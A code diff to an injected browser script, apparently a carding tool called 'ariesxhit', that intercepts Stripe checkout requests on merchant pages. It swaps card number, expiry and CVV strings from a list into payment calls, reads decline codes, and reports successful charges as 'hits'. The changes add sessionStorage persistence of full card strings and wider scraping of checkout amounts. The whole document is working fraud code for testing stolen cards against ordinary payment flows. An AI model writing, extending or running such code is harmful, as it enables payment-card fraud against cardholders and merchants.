@@ -10,6 +10,47 @@
 
   let state = { autoHitActive: false, cardList: [], currentIndex: 0, attemptCount: 0, pendingCard: null, lastTriedCard: null, hitSent: false };
 
+  // Helper functions for persistent card storage
+  function savePendingCard(card) {
+    try {
+      if (card) {
+        sessionStorage.setItem('ariesxhit_pending_card', card);
+        console.log('[CardStorage] Saved pending card to sessionStorage');
+      }
+    } catch (e) {
+      console.error('[CardStorage] Failed to save pending card:', e);
+    }
+  }
+
+  function getPendingCard() {
+    try {
+      const card = sessionStorage.getItem('ariesxhit_pending_card');
+      return card || null;
+    } catch (e) {
+      console.error('[CardStorage] Failed to get pending card:', e);
+      return null;
+    }
+  }
+
+  function clearPendingCard() {
+    try {
+      sessionStorage.removeItem('ariesxhit_pending_card');
+      console.log('[CardStorage] Cleared pending card from sessionStorage');
+    } catch (e) {
+      console.error('[CardStorage] Failed to clear pending card:', e);
+    }
+  }
+
+  // Load pending card on initialization
+  state.pendingCard = getPendingCard();
+
+  // Load last tried card
+  try {
+    state.lastTriedCard = sessionStorage.getItem('ariesxhit_last_card') || null;
+  } catch (e) {
+    console.error('[CardStorage] Failed to load last card:', e);
+  }
+
   const STRIPE_PM = 'api.stripe.com/v1/payment_methods';
   const STRIPE_CONFIRM = 'api.stripe.com/v1/payment_pages';
   const STRIPE_PI = 'api.stripe.com/v1/payment_intents';
@@ -38,34 +79,57 @@
 
   function tryExtractAmount() {
     try {
-      const txt = (document.body && document.body.innerText) || '';
+      // Check document title first (sometimes amounts are in titles)
+      const title = document.title || '';
+      console.log('[tryExtractAmount] Checking document title:', title);
 
-      // Try multiple patterns to find amounts
+      // Check meta tags for pricing info
+      const metaTags = document.querySelectorAll('meta[name], meta[property]');
+      for (const meta of metaTags) {
+        const content = meta.content || '';
+        if (content.includes('$') || content.includes('price') || content.includes('amount')) {
+          console.log('[tryExtractAmount] Found meta content:', content);
+        }
+      }
+
+      // Get all text content
+      const txt = (document.body && document.body.innerText) || '';
+      const allText = title + ' ' + txt;
+
+      console.log('[tryExtractAmount] Searching text length:', allText.length);
+
+      // Try multiple patterns to find amounts (ordered by specificity)
       const patterns = [
-        /\$[\d,]+\.?\d*/,  // $1,234.56
-        /USD\s*[\d,]+\.?\d*/i,  // USD 1234.56
-        /€[\d,]+\.?\d*/,  // €1,234.56
-        /£[\d,]+\.?\d*/,  // £1,234.56
-        /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*(usd|eur|gbp|cad|aud)/i,  // 1234.56 USD
-        /total[:\s]*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,  // Total: $1234.56 or Total: 1234.56
-        /amount[:\s]*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,  // Amount: $1234.56
-        /pay[:\s]*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,  // Pay: $1234.56
+        // Specific Stripe/Commerce patterns
+        /total[:\s]+[\$€£]?\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,  // "Total: $123.45"
+        /amount[:\s]+[\$€£]?\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,  // "Amount: $123.45"
+        /price[:\s]+[\$€£]?\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,   // "Price: $123.45"
+        /pay[:\s]+[\$€£]?\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,     // "Pay: $123.45"
+
+        // General currency patterns
+        /[\$€£](\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,  // $123.45, €123.45, £123.45
+        /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*(usd|eur|gbp|cad|aud)/i,  // 123.45 USD
+
+        // Fallback patterns
+        /\b(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\b/g,  // Any number that looks like currency
       ];
 
       for (const pattern of patterns) {
-        const match = txt.match(pattern);
-        if (match) {
-          // Clean up the amount
-          let amount = match[1] || match[0];
-          amount = amount.replace(/[^\d.]/g, '');
-          if (amount && parseFloat(amount) > 0) {
-            console.log('[tryExtractAmount] Found amount:', amount, 'from pattern:', pattern);
-            return '$' + parseFloat(amount).toFixed(2);
+        const matches = allText.match(pattern);
+        if (matches) {
+          for (const match of matches) {
+            // Clean up the amount
+            let amount = match.replace(/[^\d.]/g, '');
+            const numAmount = parseFloat(amount);
+            if (numAmount > 0 && numAmount < 10000) { // Reasonable amount range
+              console.log('[tryExtractAmount] Found amount:', numAmount, 'from pattern:', pattern, 'original:', match);
+              return '$' + numAmount.toFixed(2);
+            }
           }
         }
       }
 
-      console.log('[tryExtractAmount] No amount found in page text');
+      console.log('[tryExtractAmount] No amount found in page content');
       return '';
     } catch (e) {
       console.error('[tryExtractAmount] Error:', e);
@@ -410,6 +474,11 @@
         state.attemptCount++;
         const cardStr = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
         state.lastTriedCard = cardStr;
+        try {
+          sessionStorage.setItem('ariesxhit_last_card', cardStr);
+        } catch (e) {
+          console.error('[CardStorage] Failed to save last card:', e);
+        }
         send('CARD_TRYING', { attempt: state.attemptCount, card: cardStr });
         let newBody = replaceCardInBody(bodyStr, card);
         newBody = replaceBillingInBody(newBody);
@@ -421,9 +490,10 @@
           const data = parseResponse(text);
           if (data?.error?.code) {
             const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code;
-            send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || decline_code, card: state.pendingCard || state.lastTriedCard });
+            send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
           } else if (data?.id && String(data.id).startsWith('pm_') && !data?.error) {
             state.pendingCard = cardStr;
+            savePendingCard(cardStr);
           }
         });
         return res;
@@ -434,16 +504,18 @@
       const clone = res.clone();
       clone.text().then((text) => {
         const data = parseResponse(text);
-        const card = state.pendingCard;
+        const card = state.pendingCard || getPendingCard();
         if (data?.error) {
           state.pendingCard = null;
+clearPendingCard();
           const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code || 'declined';
-          send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || data.error?.user_message || decline_code, card: state.pendingCard || state.lastTriedCard });
+          send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || data.error?.user_message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
         } else if (card && !data?.error) {
           const status = data?.payment_intent?.status || data?.status;
           const needs3DS = status === 'requires_action' || (data?.redirect_url && /authenticate|3ds|challenge/i.test(data.redirect_url || ''));
           if (status === 'succeeded' || data?.status === 'complete' || (data?.redirect_url && !needs3DS)) {
             state.pendingCard = null;
+clearPendingCard();
             console.log('[HIT] Sending hit notification with card:', card);
 sendHitOnce(card);
           }
@@ -458,13 +530,15 @@ sendHitOnce(card);
         if (!data) return;
         const status = data.status;
         const lastErr = data.last_payment_error;
-        const card = state.pendingCard;
+        const card = state.pendingCard || getPendingCard();
         if (status === 'succeeded' && card) {
           state.pendingCard = null;
+clearPendingCard();
           console.log('[HIT] Sending hit notification with card:', card);
 sendHitOnce(card);
         } else if ((status === 'requires_payment_method' || status === 'canceled') && lastErr) {
           state.pendingCard = null;
+clearPendingCard();
           const decline_code = lastErr.decline_code || lastErr.code || 'card_declined';
           send('CARD_ERROR', { code: decline_code, decline_code, message: lastErr.message || decline_code, card });
         }
@@ -479,11 +553,13 @@ sendHitOnce(card);
         const err = data.last_setup_error || data.last_payment_error;
         if (err && (err.decline_code || err.code)) {
           state.pendingCard = null;
+clearPendingCard();
           const decline_code = err.decline_code || err.code || 'card_declined';
-          send('CARD_ERROR', { code: decline_code, decline_code, message: err.message || decline_code, card: state.pendingCard || state.lastTriedCard });
+          send('CARD_ERROR', { code: decline_code, decline_code, message: err.message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
         } else if (data.status === 'succeeded' && !err) {
-          const card = state.pendingCard || state.lastTriedCard;
+          const card = state.pendingCard || getPendingCard() || state.lastTriedCard;
           state.pendingCard = null;
+clearPendingCard();
           console.log('[HIT] Sending hit notification with card:', card);
 sendHitOnce(card);
         }
@@ -496,8 +572,9 @@ sendHitOnce(card);
         const data = parseResponse(text);
         if (!data || data.object !== 'setup_intent') return;
         if (data.status === 'succeeded' && !data.last_setup_error) {
-          const card = state.pendingCard || state.lastTriedCard;
+          const card = state.pendingCard || getPendingCard() || state.lastTriedCard;
           state.pendingCard = null;
+clearPendingCard();
           console.log('[HIT] Sending hit notification with card:', card);
 sendHitOnce(card);
         }
@@ -522,16 +599,18 @@ sendHitOnce(card);
     if (isConfirmUrl(url) && state.autoHitActive && method === 'POST') {
       this.addEventListener('load', function () {
         const data = parseResponse(this.responseText);
-        const card = state.pendingCard;
+        const card = state.pendingCard || getPendingCard();
         if (data?.error) {
           state.pendingCard = null;
+clearPendingCard();
           const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code || 'declined';
-          send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || data.error?.user_message || decline_code, card: state.pendingCard || state.lastTriedCard });
+          send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || data.error?.user_message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
         } else if (card && !data?.error) {
           const status = data?.payment_intent?.status || data?.status;
           const needs3DS = status === 'requires_action' || (data?.redirect_url && /authenticate|3ds|challenge/i.test(data.redirect_url || ''));
           if (status === 'succeeded' || data?.status === 'complete' || (data?.redirect_url && !needs3DS)) {
             state.pendingCard = null;
+clearPendingCard();
             console.log('[HIT] Sending hit notification with card:', card);
 sendHitOnce(card);
           }
@@ -545,13 +624,15 @@ sendHitOnce(card);
         if (!data) return;
         const status = data.status;
         const lastErr = data.last_payment_error;
-        const card = state.pendingCard;
+        const card = state.pendingCard || getPendingCard();
         if (status === 'succeeded' && card) {
           state.pendingCard = null;
+clearPendingCard();
           console.log('[HIT] Sending hit notification with card:', card);
 sendHitOnce(card);
         } else if ((status === 'requires_payment_method' || status === 'canceled') && lastErr) {
           state.pendingCard = null;
+clearPendingCard();
           const decline_code = lastErr.decline_code || lastErr.code || 'card_declined';
           send('CARD_ERROR', { code: decline_code, decline_code, message: lastErr.message || decline_code, card });
         }
@@ -565,11 +646,13 @@ sendHitOnce(card);
         const err = data.last_setup_error || data.last_payment_error;
         if (err && (err.decline_code || err.code)) {
           state.pendingCard = null;
+clearPendingCard();
           const decline_code = err.decline_code || err.code || 'card_declined';
-          send('CARD_ERROR', { code: decline_code, decline_code, message: err.message || decline_code, card: state.pendingCard || state.lastTriedCard });
+          send('CARD_ERROR', { code: decline_code, decline_code, message: err.message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
         } else if (data.status === 'succeeded' && !err) {
-          const card = state.pendingCard || state.lastTriedCard;
+          const card = state.pendingCard || getPendingCard() || state.lastTriedCard;
           state.pendingCard = null;
+clearPendingCard();
           console.log('[HIT] Sending hit notification with card:', card);
 sendHitOnce(card);
         }
@@ -581,8 +664,9 @@ sendHitOnce(card);
         const data = parseResponse(this.responseText);
         if (!data || data.object !== 'setup_intent') return;
         if (data.status === 'succeeded' && !data.last_setup_error) {
-          const card = state.pendingCard || state.lastTriedCard;
+          const card = state.pendingCard || getPendingCard() || state.lastTriedCard;
           state.pendingCard = null;
+clearPendingCard();
           console.log('[HIT] Sending hit notification with card:', card);
 sendHitOnce(card);
         }
@@ -596,6 +680,11 @@ sendHitOnce(card);
         state.attemptCount++;
         const cardStr = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
         state.lastTriedCard = cardStr;
+        try {
+          sessionStorage.setItem('ariesxhit_last_card', cardStr);
+        } catch (e) {
+          console.error('[CardStorage] Failed to save last card:', e);
+        }
         send('CARD_TRYING', { attempt: state.attemptCount, card: cardStr });
         let newBody = replaceCardInBody(bodyStr, card);
         newBody = replaceBillingInBody(newBody);
@@ -603,7 +692,7 @@ sendHitOnce(card);
           const data = parseResponse(this.responseText);
           if (data?.error?.code) {
             const decline_code = data.error.decline_code || data.error.payment_intent?.last_payment_error?.decline_code || data.error.code;
-            send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || decline_code, card: state.pendingCard || state.lastTriedCard });
+            send('CARD_ERROR', { code: decline_code, decline_code, message: data.error?.message || decline_code, card: state.pendingCard || getPendingCard() || state.lastTriedCard });
           } else if (data?.id && String(data.id).startsWith('pm_') && !data?.error) {
             state.pendingCard = cardStr;
           }
